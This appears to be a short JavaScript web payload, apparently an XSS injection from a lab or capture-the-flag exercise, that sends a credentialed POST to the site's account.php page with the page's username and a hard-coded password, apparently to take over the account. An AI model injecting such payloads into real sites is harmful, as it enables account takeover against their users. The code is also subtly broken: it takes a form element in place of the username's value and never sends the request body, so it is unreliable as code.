let xhr = new XMLHttpRequest();

xhr.open('POST', `${origin}/index.php?page=account.php`);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.withCredentials = true;

let username = document.querySelector('input[name="username"]')
let password = 'Dom@1234'
let data = `username=${username}&password=${password}`

xhr.send();

xhr.onload = function() {
  if (xhr.status != 200) {
    console.log(`Error ${xhr.status}: ${xhr.statusText}`);
  } else {
    console.log(`Done!`);
  }
};

// xhr.onerror = function() {
//   console.log("Request failed");
// };
